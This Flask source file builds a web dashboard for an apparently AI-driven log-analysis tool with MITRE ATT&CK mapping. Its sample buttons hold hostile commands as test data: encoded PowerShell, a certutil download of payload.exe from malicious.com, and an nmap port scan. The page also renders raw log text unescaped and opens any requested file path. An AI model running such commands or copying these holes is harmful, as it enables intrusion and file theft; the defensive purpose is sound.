# ui/app.py — T17 Web Dashboard
# Run with: python ui/app.py
# Opens at: http://localhost:5000

import sys
import os
import json
from datetime import datetime

# Add root to path so core imports work
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from flask import Flask, request, jsonify, render_template_string
from core.log_parser import parse_logs, parse_log
from core.curiosity import score_input, analyze_novelty
from core.ai_brain import AIBrain
from core.reflection import reflect
from core.memory import load_memory, save_to_memory, search_memory
from core.report_generator import generate_report

app = Flask(__name__)
brain = AIBrain()

# ── HTML TEMPLATE ─────────────────────────────────────────────
HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>T17 — Cybersecurity Dashboard</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #0D1117; color: #CBD5E1; min-height: 100vh; }

  /* HEADER */
  .header { background: #0F2942; border-bottom: 3px solid #0D9488; padding: 16px 24px; display: flex; align-items: center; justify-content: space-between; }
  .header-left { display: flex; align-items: center; gap: 12px; }
  .logo { font-size: 22px; font-weight: bold; color: #fff; }
  .logo span { color: #0D9488; }
  .tagline { font-size: 13px; color: #475569; }
  .badges { display: flex; gap: 8px; }
  .badge { font-size: 11px; font-weight: bold; padding: 4px 10px; border-radius: 4px; }
  .badge-teal { background: #0D9488; color: #fff; }
  .badge-purple { background: #6D28D9; color: #fff; }
  .badge-amber { background: #1A3553; color: #F59E0B; border: 1px solid #F59E0B; }

  /* LAYOUT */
  .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
  .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 20px; }

  /* CARDS */
  .card { background: #1E293B; border: 1px solid #1E40AF; border-radius: 8px; padding: 20px; }
  .card-title { font-size: 13px; font-weight: bold; color: #0D9488; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 14px; }

  /* STAT CARDS */
  .stat-card { background: #1E293B; border: 1px solid #334155; border-radius: 8px; padding: 16px; text-align: center; }
  .stat-value { font-size: 28px; font-weight: bold; color: #0D9488; }
  .stat-label { font-size: 12px; color: #475569; margin-top: 4px; }

  /* INPUTS */
  textarea, input[type=text] { width: 100%; background: #0D1117; border: 1px solid #334155; border-radius: 6px; color: #CBD5E1; padding: 10px 12px; font-size: 14px; font-family: monospace; resize: vertical; }
  textarea:focus, input[type=text]:focus { outline: none; border-color: #0D9488; }

  /* BUTTONS */
  .btn { padding: 10px 20px; border-radius: 6px; border: none; font-size: 14px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
  .btn:hover { opacity: 0.85; }
  .btn-teal { background: #0D9488; color: #fff; }
  .btn-purple { background: #6D28D9; color: #fff; }
  .btn-red { background: #991B1B; color: #fff; }

  /* RESULTS */
  .result-list { display: flex; flex-direction: column; gap: 12px; max-height: 500px; overflow-y: auto; }
  .threat-card { background: #0D1117; border-left: 4px solid #0D9488; border-radius: 4px; padding: 14px; }
  .threat-card.critical { border-left-color: #E24B4A; }
  .threat-card.high { border-left-color: #F59E0B; }
  .threat-card.medium { border-left-color: #378ADD; }
  .threat-card.low { border-left-color: #1D9E75; }
  .threat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
  .threat-mitre { font-size: 12px; font-weight: bold; color: #0D9488; background: #0D2438; padding: 3px 8px; border-radius: 4px; }
  .severity-badge { font-size: 11px; font-weight: bold; padding: 3px 8px; border-radius: 4px; }
  .sev-critical { background: #7F1D1D; color: #FCA5A5; }
  .sev-high { background: #451A03; color: #FCD34D; }
  .sev-medium { background: #1E3A5F; color: #93C5FD; }
  .sev-low { background: #064E3B; color: #6EE7B7; }
  .sev-unknown { background: #1F2937; color: #9CA3AF; }
  .threat-log { font-size: 13px; font-family: monospace; color: #94A3B8; margin-bottom: 6px; word-break: break-all; }
  .threat-reasoning { font-size: 12px; color: #475569; margin-top: 6px; line-height: 1.5; }
  .confidence-bar { height: 4px; background: #334155; border-radius: 2px; margin: 8px 0; }
  .confidence-fill { height: 4px; border-radius: 2px; background: #0D9488; }
  .meta-row { display: flex; gap: 16px; font-size: 12px; color: #475569; margin-top: 6px; }

  /* MEMORY TABLE */
  .mem-table { width: 100%; border-collapse: collapse; font-size: 13px; }
  .mem-table th { text-align: left; padding: 8px 12px; color: #0D9488; font-size: 11px; text-transform: uppercase; border-bottom: 1px solid #334155; }
  .mem-table td { padding: 8px 12px; border-bottom: 1px solid #1E293B; color: #94A3B8; }
  .mem-table tr:hover td { background: #1E293B; }

  /* STATUS */
  .status { font-size: 13px; color: #0D9488; padding: 10px; background: #0D2438; border-radius: 6px; margin-top: 12px; display: none; }
  .status.show { display: block; }
  .loading { color: #F59E0B; }
  .empty { text-align: center; padding: 40px; color: #334155; font-size: 14px; }

  /* VERDICT */
  .verdict { font-size: 13px; font-weight: bold; margin-top: 6px; }

  /* NAV TABS */
  .tabs { display: flex; gap: 4px; margin-bottom: 20px; }
  .tab { padding: 8px 18px; border-radius: 6px; font-size: 13px; font-weight: bold; cursor: pointer; border: 1px solid #334155; background: transparent; color: #475569; transition: all 0.2s; }
  .tab.active { background: #0D9488; color: #fff; border-color: #0D9488; }
  .tab-panel { display: none; }
  .tab-panel.active { display: block; }
</style>
</head>
<body>

<!-- HEADER -->
<div class="header">
  <div class="header-left">
    <div>
      <div class="logo">T<span>17</span></div>
      <div class="tagline">Offline AI Cybersecurity Framework</div>
    </div>
  </div>
  <div class="badges">
    <span class="badge badge-teal">100% Offline</span>
    <span class="badge badge-purple">Tiered LLM</span>
    <span class="badge badge-amber">MITRE ATT&CK</span>
  </div>
</div>

<div class="container">

  <!-- STAT CARDS -->
  <div class="grid-4" id="stats">
    <div class="stat-card"><div class="stat-value" id="stat-scanned">0</div><div class="stat-label">Logs scanned</div></div>
    <div class="stat-card"><div class="stat-value" id="stat-threats">0</div><div class="stat-label">Threats detected</div></div>
    <div class="stat-card"><div class="stat-value" id="stat-critical" style="color:#E24B4A">0</div><div class="stat-label">Critical</div></div>
    <div class="stat-card"><div class="stat-value" id="stat-memory">0</div><div class="stat-label">In memory</div></div>
  </div>

  <!-- TABS -->
  <div class="tabs">
    <button class="tab active" onclick="showTab('analyse')">Analyse</button>
    <button class="tab" onclick="showTab('scan')">Scan file</button>
    <button class="tab" onclick="showTab('memory')">Memory</button>
  </div>

  <!-- TAB: ANALYSE -->
  <div class="tab-panel active" id="tab-analyse">
    <div class="grid-2">
      <div class="card">
        <div class="card-title">Analyse a log entry</div>
        <textarea id="log-input" rows="5" placeholder="Paste a suspicious log line here...&#10;&#10;e.g. powershell -enc SQBuAHYAbwBrAGUALQBX..."></textarea>
        <div style="margin-top: 12px; display: flex; gap: 8px;">
          <button class="btn btn-teal" onclick="analyseLog()">Analyse</button>
          <button class="btn btn-red" onclick="clearAll()">Clear</button>
        </div>
        <div class="status" id="analyse-status"></div>
      </div>
      <div class="card">
        <div class="card-title">Quick test logs</div>
        <div style="display: flex; flex-direction: column; gap: 8px;">
          <button class="btn btn-purple" onclick="loadSample('powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==')">PowerShell encoded</button>
          <button class="btn btn-purple" onclick="loadSample('User root attempted sudo access from 172.16.0.5 via SSH')">Root sudo access</button>
          <button class="btn btn-purple" onclick="loadSample('certutil -urlcache -split -f http://malicious.com/payload.exe')">Certutil download</button>
          <button class="btn btn-purple" onclick="loadSample('Failed login from 192.168.0.10 via SSH')">Failed login</button>
          <button class="btn btn-purple" onclick="loadSample('nmap -sS -p 1-65535 192.168.1.1 port scan detected')">Port scan</button>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Results</div>
      <div class="result-list" id="results">
        <div class="empty">No analysis yet — enter a log above</div>
      </div>
    </div>
  </div>

  <!-- TAB: SCAN FILE -->
  <div class="tab-panel" id="tab-scan">
    <div class="card">
      <div class="card-title">Scan a log file</div>
      <input type="text" id="file-path" placeholder="Path to log file e.g. logs/test.log" />
      <div style="margin-top: 12px; display: flex; gap: 8px;">
        <button class="btn btn-teal" onclick="scanFile()">Scan file</button>
        <button class="btn btn-purple" onclick="scanFile(true)">Scan + save report</button>
      </div>
      <div class="status" id="scan-status"></div>
    </div>
    <div class="card" style="margin-top: 20px;">
      <div class="card-title">Scan results</div>
      <div class="result-list" id="scan-results">
        <div class="empty">No file scanned yet</div>
      </div>
    </div>
  </div>

  <!-- TAB: MEMORY -->
  <div class="tab-panel" id="tab-memory">
    <div class="card">
      <div class="card-title">Threat memory store</div>
      <div style="margin-bottom: 12px; display: flex; gap: 8px;">
        <button class="btn btn-teal" onclick="loadMemory()">Refresh</button>
        <button class="btn btn-red" onclick="clearMemory()">Clear memory</button>
      </div>
      <div id="memory-content">
        <div class="empty">Loading memory...</div>
      </div>
    </div>
  </div>

</div>

<script>
let totalScanned = 0;
let totalThreats = 0;
let totalCritical = 0;

function showTab(name) {
  document.querySelectorAll('.tab').forEach((t, i) => {
    t.classList.toggle('active', ['analyse','scan','memory'][i] === name);
  });
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  if (name === 'memory') loadMemory();
}

function loadSample(text) {
  document.getElementById('log-input').value = text;
}

function severityClass(sev) {
  const s = (sev || '').toLowerCase();
  if (s === 'critical') return 'critical';
  if (s === 'high') return 'high';
  if (s === 'medium') return 'medium';
  if (s === 'low') return 'low';
  return '';
}

function renderThreat(r) {
  if (r.status === 'discarded') {
    return `<div class="threat-card">
      <div class="threat-log">${r.raw || 'unknown input'}</div>
      <div style="font-size:12px; color:#334155;">Score too low — not suspicious enough</div>
    </div>`;
  }
  const mitre = r.mitre || {};
  const conf = r.confidence || 0;
  const sev = (r.severity || 'unknown').toLowerCase();
  const reasoning = (r.reasoning || '').substring(0, 200);
  return `<div class="threat-card ${severityClass(sev)}">
    <div class="threat-header">
      <span class="threat-mitre">${mitre.id || 'T0000'} — ${mitre.name || 'Unknown'}</span>
      <span class="severity-badge sev-${sev}">${sev.toUpperCase()}</span>
    </div>
    <div class="confidence-bar"><div class="confidence-fill" style="width:${conf}%"></div></div>
    <div class="meta-row">
      <span>Confidence: ${conf}/100</span>
      <span>Model: ${r.model_used || 'unknown'}</span>
      <span>Tactic: ${mitre.tactic || 'unknown'}</span>
    </div>
    <div class="verdict">${r.verdict || ''}</div>
    <div class="threat-reasoning">${reasoning}${reasoning.length >= 200 ? '...' : ''}</div>
  </div>`;
}

async function analyseLog() {
  const text = document.getElementById('log-input').value.trim();
  if (!text) return;
  const status = document.getElementById('analyse-status');
  status.textContent = 'Analysing with AI...';
  status.className = 'status show loading';

  try {
    const res = await fetch('/analyse', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({text})
    });
    const data = await res.json();
    status.textContent = 'Done.';
    status.className = 'status show';

    const container = document.getElementById('results');
    const existing = container.querySelector('.empty');
    if (existing) existing.remove();

    const div = document.createElement('div');
    div.innerHTML = renderThreat(data);
    container.prepend(div.firstChild);

    totalScanned++;
    if (data.status === 'threat_report') {
      totalThreats++;
      if ((data.severity || '').toLowerCase() === 'critical') totalCritical++;
    }
    updateStats();
  } catch(e) {
    status.textContent = 'Error: ' + e.message;
    status.className = 'status show';
  }
}

async function scanFile(saveReport = false) {
  const path = document.getElementById('file-path').value.trim();
  if (!path) return;
  const status = document.getElementById('scan-status');
  status.textContent = 'Scanning file...';
  status.className = 'status show loading';

  try {
    const res = await fetch('/scan', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({path, save_report: saveReport})
    });
    const data = await res.json();

    if (data.error) {
      status.textContent = 'Error: ' + data.error;
      return;
    }

    status.textContent = `Scanned ${data.logs_analysed} logs — ${data.threats_found} threat(s) detected${data.report_path ? ' | Report: ' + data.report_path : ''}`;
    status.className = 'status show';

    const container = document.getElementById('scan-results');
    container.innerHTML = '';
    if (!data.results || data.results.length === 0) {
      container.innerHTML = '<div class="empty">No threats detected</div>';
    } else {
      data.results.forEach(r => {
        const div = document.createElement('div');
        div.innerHTML = renderThreat(r);
        container.appendChild(div.firstChild);
      });
    }

    totalScanned += data.logs_analysed || 0;
    totalThreats += data.threats_found || 0;
    totalCritical += data.critical_count || 0;
    updateStats();
  } catch(e) {
    status.textContent = 'Error: ' + e.message;
    status.className = 'status show';
  }
}

async function loadMemory() {
  try {
    const res = await fetch('/memory');
    const data = await res.json();
    const container = document.getElementById('memory-content');

    document.getElementById('stat-memory').textContent = data.length;

    if (data.length === 0) {
      container.innerHTML = '<div class="empty">Memory is empty</div>';
      return;
    }

    container.innerHTML = `<table class="mem-table">
      <thead><tr>
        <th>Event</th><th>IP</th><th>Protocol</th><th>Severity</th><th>MITRE ID</th>
      </tr></thead>
      <tbody>
        ${data.map(m => `<tr>
          <td style="max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${m.event || '-'}</td>
          <td>${m.ip || '-'}</td>
          <td>${m.protocol || '-'}</td>
          <td><span class="severity-badge sev-${(m.severity||'unknown').toLowerCase()}">${(m.severity||'unknown').toUpperCase()}</span></td>
          <td style="color:#0D9488">${m.mitre_id || '-'}</td>
        </tr>`).join('')}
      </tbody>
    </table>`;
  } catch(e) {
    document.getElementById('memory-content').innerHTML = '<div class="empty">Could not load memory</div>';
  }
}

async function clearMemory() {
  await fetch('/memory/clear', {method: 'POST'});
  loadMemory();
  totalScanned = 0; totalThreats = 0; totalCritical = 0;
  updateStats();
}

function clearAll() {
  document.getElementById('log-input').value = '';
  document.getElementById('results').innerHTML = '<div class="empty">No analysis yet — enter a log above</div>';
  document.getElementById('analyse-status').className = 'status';
}

function updateStats() {
  document.getElementById('stat-scanned').textContent = totalScanned;
  document.getElementById('stat-threats').textContent = totalThreats;
  document.getElementById('stat-critical').textContent = totalCritical;
}

loadMemory();
</script>
</body>
</html>
"""

# ── ROUTES ────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/analyse", methods=["POST"])
def analyse():
    data = request.get_json()
    text = data.get("text", "").strip()
    if not text:
        return jsonify({"error": "No text provided"})

    log = parse_log(text)
    score = score_input(text, log)

    if score < 4:
        return jsonify({
            "status":  "discarded",
            "raw":     text,
            "score":   score,
            "reason":  "Score below threshold"
        })

    brain_result = brain.analyse(text, score=score)
    report       = reflect(brain_result)
    report["raw"] = text

    if report.get("status") == "threat_report":
        save_to_memory({
            "raw":        text,
            "ip":         log.get("ip", "unknown"),
            "event":      log.get("event", "unknown"),
            "protocol":   log.get("protocol", "unknown"),
            "severity":   report.get("severity"),
            "confidence": report.get("confidence"),
            "mitre_id":   report.get("mitre", {}).get("id")
        })

    return jsonify(report)

@app.route("/scan", methods=["POST"])
def scan():
    data      = request.get_json()
    filepath  = data.get("path", "").strip()
    save_rep  = data.get("save_report", False)

    if not os.path.exists(filepath):
        return jsonify({"error": f"File not found: {filepath}"})

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        raw_logs = f.readlines()

    structured = parse_logs(raw_logs)
    results    = []
    critical   = 0

    for log in structured:
        raw_text = log.get("raw", "").strip()
        if not raw_text:
            continue

        score    = score_input(raw_text, log)
        existing = search_memory(log)

        if score < 4 or existing:
            continue

        brain_result = brain.analyse(raw_text, score=score)
        report       = reflect(brain_result)
        report["raw"] = raw_text
        results.append(report)

        if report.get("status") == "threat_report":
            if (report.get("severity") or "").lower() == "critical":
                critical += 1
            save_to_memory({
                "raw":        raw_text,
                "ip":         log.get("ip", "unknown"),
                "event":      log.get("event", "unknown"),
                "protocol":   log.get("protocol", "unknown"),
                "severity":   report.get("severity"),
                "confidence": report.get("confidence"),
                "mitre_id":   report.get("mitre", {}).get("id")
            })

    report_path = None
    if save_rep:
        report_path = generate_report(
            scan_results  = results,
            logs_analysed = len(structured),
            source        = filepath
        )

    return jsonify({
        "logs_analysed": len(structured),
        "threats_found": len(results),
        "critical_count": critical,
        "results":       results,
        "report_path":   report_path
    })

@app.route("/memory")
def get_memory():
    return jsonify(load_memory())

@app.route("/memory/clear", methods=["POST"])
def clear_memory_route():
    memory_file = "data/memory.json"
    with open(memory_file, "w", encoding="utf-8") as f:
        json.dump([], f)
    return jsonify({"status": "cleared"})

# ── START ─────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "="*50)
    print("  T17 Web Dashboard")
    print("  Open your browser at: http://localhost:5000")
    print("="*50 + "\n")
    app.run(debug=False, port=5000)